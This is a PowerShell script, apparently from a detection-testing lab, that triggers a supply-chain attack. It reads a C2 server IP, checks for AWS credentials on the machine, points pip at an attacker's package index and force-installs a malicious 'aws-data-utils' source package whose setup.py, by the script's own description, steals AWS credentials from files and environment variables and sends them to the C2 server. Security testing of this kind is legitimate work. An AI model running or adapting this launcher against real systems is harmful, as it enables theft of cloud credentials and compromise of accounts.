# Trigger Supply Chain Attack (Windows Version) - Direct pip install
# Install malicious package that will steal AWS credentials

param(
    [string]$C2_IP
)

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "  Triggering Supply Chain Attack (pip)" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""

# Get script directory
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $ScriptDir

# Get C2 IP from parameter, config file, or prompt
if (-not $C2_IP) {
    $C2_IP_File = Join-Path $ScriptDir ".c2_server_ip"
    if (Test-Path $C2_IP_File) {
        $C2_IP = Get-Content $C2_IP_File -Raw | ForEach-Object { $_.Trim() }
        Write-Host "[*] Using C2 IP from config: $C2_IP" -ForegroundColor Yellow
    } else {
        $C2_IP = Read-Host "Enter C2 Server IP"
    }
}

Write-Host "[*] C2 Server: $C2_IP" -ForegroundColor Yellow
Write-Host ""

# Check if AWS credentials exist
$AwsCreds = Join-Path $env:USERPROFILE ".aws\credentials"
if (-not (Test-Path $AwsCreds)) {
    Write-Host "[-] Warning: AWS credentials file not found at $AwsCreds" -ForegroundColor Yellow
    Write-Host "    The malicious package will have nothing to steal from file!" -ForegroundColor Yellow
    Write-Host ""
}

# Check if environment variables are set
if (-not $env:AWS_ACCESS_KEY_ID) {
    Write-Host "[-] Warning: AWS environment variables not set" -ForegroundColor Yellow
    Write-Host "    The malicious package will have nothing to steal from environment!" -ForegroundColor Yellow
    Write-Host ""
}

Write-Host "WARNING: ATTACK SIMULATION STARTING" -ForegroundColor Red
Write-Host ""
Write-Host "[*] This will:" -ForegroundColor Yellow
Write-Host "    1. Install malicious 'aws-data-utils' package from attacker's PyPI" -ForegroundColor Yellow
Write-Host "    2. Steal AWS credentials from ~/.aws/credentials" -ForegroundColor Yellow
Write-Host "    3. Steal AWS credentials from environment variables" -ForegroundColor Yellow
Write-Host "    4. Exfiltrate credentials to C2 server" -ForegroundColor Yellow
Write-Host ""

$Confirm = Read-Host "Continue with attack? (yes/no)"
if ($Confirm -ne "yes") {
    Write-Host "Attack cancelled." -ForegroundColor Gray
    exit 0
}

Write-Host ""
Write-Host "[*] Clearing pip cache..." -ForegroundColor Gray
pip cache purge 2>&1 | Out-Null

Write-Host "[*] Installing malicious package using pip.conf..." -ForegroundColor Yellow
Write-Host ""

# Set pip config to use the local pip.conf
$PipConfPath = Join-Path $ScriptDir ".pip\pip.conf"
if (Test-Path $PipConfPath) {
    $env:PIP_CONFIG_FILE = $PipConfPath
    Write-Host "[*] Using pip config: $PipConfPath" -ForegroundColor Gray
} else {
    Write-Host "[-] Warning: pip.conf not found, using direct install" -ForegroundColor Yellow
}

# Install package - force source distribution to trigger setup.py
pip install --no-binary aws-data-utils --timeout=60 aws-data-utils

Write-Host ""
if ($LASTEXITCODE -eq 0) {
    Write-Host "[SUCCESS] Package installation complete!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Check the C2 server terminal for stolen credentials!" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "WARNING: Check Cortex XDR console for alerts:" -ForegroundColor Yellow
    Write-Host "    - Suspicious pip install to unusual IP" -ForegroundColor Yellow
    Write-Host "    - Python accessing .aws/credentials" -ForegroundColor Yellow
    Write-Host "    - Outbound connection to C2 server" -ForegroundColor Yellow
} else {
    Write-Host "[-] Installation failed!" -ForegroundColor Red
    Write-Host "Check the output above for errors." -ForegroundColor Red
}

Write-Host ""
